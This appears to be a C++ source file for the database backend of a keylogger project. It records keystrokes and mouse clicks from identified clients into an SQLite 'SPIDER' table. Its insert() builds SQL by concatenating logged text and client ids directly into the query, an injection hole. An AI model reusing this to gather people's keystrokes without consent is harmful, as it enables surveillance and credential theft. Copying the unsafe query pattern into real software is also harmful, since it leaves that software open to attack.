#include <KeyStroke.hpp>
#include <MouseClick.hpp>
#include "DataBaseLog.hpp"

//AFactoryRegistration<ALog, DataBaseLog> fileLogFactReg("DataBaseLog");

DataBaseLog::DataBaseLog() {
    _sqlCreateTable =   "CREATE TABLE IF NOT EXISTS SPIDER("
                        "client_id TEXT,"
                        "time_stamp DATETIME DEFAULT (DATETIME('now', 'localtime')),"
                        "button CHAR DEFAULT 0,"
                        "x SHORT INTEGER DEFAULT 0,"
                        "y SHORT INTEGER DEFAULT 0,"
                        "text TEXT DEFAULT NULL,"
                        "id INTEGER PRIMARY KEY AUTOINCREMENT);";
}

DataBaseLog::~DataBaseLog()
{
    close();
}

void DataBaseLog::open(std::string const & path){
    int ret = sqlite3_open(path.c_str(), &_sqlDataBase);
    char *sqlErrMsg = nullptr;
    _good = true;
    if (ret != SQLITE_OK)
    {
        std::cerr << "Error while openenig \"" << path << "\"" << std::endl;
        std::cerr << sqlite3_errmsg(_sqlDataBase) << std::endl;
        _good = false;
    }
    ret = sqlite3_exec(_sqlDataBase, _sqlCreateTable.c_str(), nullptr, nullptr, &sqlErrMsg);
    if (ret != SQLITE_OK)
    {
        std::cerr << "Error while creating table" << std::endl;
        std::cerr << "SQL error: " << sqlErrMsg << std::endl;
        sqlite3_free(sqlErrMsg);
        _good = false;
    }

    if (_good) {
        std::cout << "Table created successfully" << std::endl;
    }
}

void DataBaseLog::close() {
    sqlite3_close(_sqlDataBase);
    _good = false;
}

void DataBaseLog::insert(APacket const &param, std::string const &id) {
    int type;
    std::string query = "", x = "", y = "";
    char *sqlErrMsg;
    char button;

    _dataBaseParser.clear();
    param.to_readable(_dataBaseParser);

    _dataBaseParser.get("Type", type);
    switch (static_cast<APacket::PacketType>(type)) {
        case APacket::PacketType::MOUSECLICK:

            _dataBaseParser.get("X", x);
            _dataBaseParser.get("Y", y);
            _dataBaseParser.get("Button", button);
            query += "INSERT INTO SPIDER(x, y, button, client_id) VALUES(" + x + ", " + y + ", "  + button + ", " + id + ");";
            break;
        case APacket::PacketType::KEYSTROKES: {
            std::string text = "";

            _dataBaseParser.get("Data", text);
            query += "INSERT INTO SPIDER(text, client_id) VALUES(\"" + text + "\", " + id + ");";
            break;
        }
        default:
            throw std::runtime_error("Non handled types");
            break;
    }
    int ret = sqlite3_exec(_sqlDataBase, query.c_str(), nullptr, nullptr, &sqlErrMsg);
    if (ret != SQLITE_OK) {
        std::cerr << sqlErrMsg << std::endl;
        sqlite3_free(sqlErrMsg);
    }
}

std::vector<APacket *> DataBaseLog::dump() {
    std::vector<APacket *> allRowSorted;
    std::string query = "SELECT * FROM SPIDER ORDER BY id ASC";
    sqlite3_stmt *stmt;
    int ret;

    ret = sqlite3_prepare(_sqlDataBase, query.c_str(), query.size() + 1, &stmt, NULL);
    if (ret != SQLITE_OK) {
        std::cerr << "Error while getting all row from spider table" << std::endl;
        return allRowSorted;
    }

    while ((ret = sqlite3_step(stmt)) == SQLITE_ROW) {
        APacket *packet = nullptr;
        const unsigned char *text = nullptr;

        text  = sqlite3_column_text (stmt, 5);
        if (text != nullptr) {
            packet = new KeyStroke(std::string(reinterpret_cast<const char *>(text)));
        } else {
            packet = new MouseClick(sqlite3_column_int(stmt, 2),
                                    sqlite3_column_int(stmt, 3),
                                    sqlite3_column_int(stmt, 4));
        }
        allRowSorted.push_back(packet);
        text = nullptr;
    }
    if (ret != SQLITE_DONE) {
        std::cerr << "Error while getting all row from spider table" << std::endl;
        return allRowSorted;
    }
    sqlite3_finalize(stmt);
    return allRowSorted;
}